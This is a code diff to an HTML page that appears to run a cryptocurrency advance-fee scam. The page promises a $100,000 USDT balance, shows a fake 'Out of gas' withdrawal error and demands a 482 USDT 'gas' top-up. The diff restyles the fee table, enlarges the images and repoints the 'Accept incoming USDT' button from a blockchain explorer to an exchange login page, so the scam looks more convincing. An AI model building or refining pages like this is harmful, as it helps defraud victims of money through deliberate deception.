@@ -41,22 +41,21 @@
     </form>
     <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
 
-  <table>
-      <tr>
-        <td style="color: Black; font-weight: bold; font-style: italic;">TETHER GAS (estimated): [$482] = 482 USDT</td>
-      </tr>
-      <tr>
-        <td style="color: Red; font-weight: bold;">CURRENTLY OUTSTANDING 482 USDT</td>
-      </tr>
-      <tr>
-        <td style="color: Blue; font-style: italic;">$0.00 USDT PAID</td>
-      </tr>
-    </table>
-
+  <table style="margin: 0 auto; width: 90%; max-width: 400px; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);">
+    <tr>
+      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>TETHER GAS (estimated):[$482] = 482 USDT</strong></td>
+      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;">CURRENTLY OUTSTANDING 482 USDT</td>
+    </tr>
+    <tr>
+      <td style="padding: 10px; text-align: left; border-bottom: 1px solid #ddd;"><strong>$0.00 USDT PAID</strong></td>
+</tr>
+  </table>
+    
   <pre>
 <span style="color: green;">RECEIVING IN 15 seconds•••••</span>
     </pre>
-    <hr>
+    
+  <hr>
 
  <h4>Payment Method</h4>
     <table style="color:#05a5f0; background-color:#f2f2f2;">
@@ -81,22 +80,22 @@
     <p style="margin: 10px 0;"> ⏬ </p>
    <span style="color: Red;">Warning! Error encountered during Withdraw execution [Out of gas]⚠️</span>
     <br>
-  ✅ This transaction is <span style="color: Red;"> Processing </span>, Top-Up USDT Gas to Complete.✓⃝
+  ✅ This transaction is <span style="color: Red;">Processing </span>,Top-Up USDT Gas to Complete.✓⃝
 
-<img src="IMG_0567.jpeg" alt="payslip" width="500" />
+<img src="IMG_0567.jpeg" alt="payslip" width="700" />
     <br>
 <span style="color: red;"><strong>SUMMARY:</strong> You need 482 USDT to complete this transaction. Buy more [$482] USDT For Gas Price!</span>
 <img src="IMG_0574.png" alt="blockchain Logo" width="21" />
     <br>
-<img src="IMG_0583.jpeg" alt="ethscan Logo" width="500" />
+<img src="IMG_0583.jpeg" alt="ethscan Logo" width="700" />
     <br>
-  <form action="https://etherscan.io/" method="get">
+  <form action="https://www.bybit.com/en/login" method="get">
   <button type="submit">Accept incoming USDT [$100,000]</button>
     </form>
 
  <hr>
- <img src="IMG_9086.gif" alt="loading gif display" width="500">
-    <img src="IMG_0561.png" alt="usdex explanation" width="500" />
+ <img src="IMG_9086.gif" alt="loading gif display" width="700">
+    <img src="IMG_0561.png" alt="usdex explanation" width="700" />
 
  l             
               <!-- Buttons -->
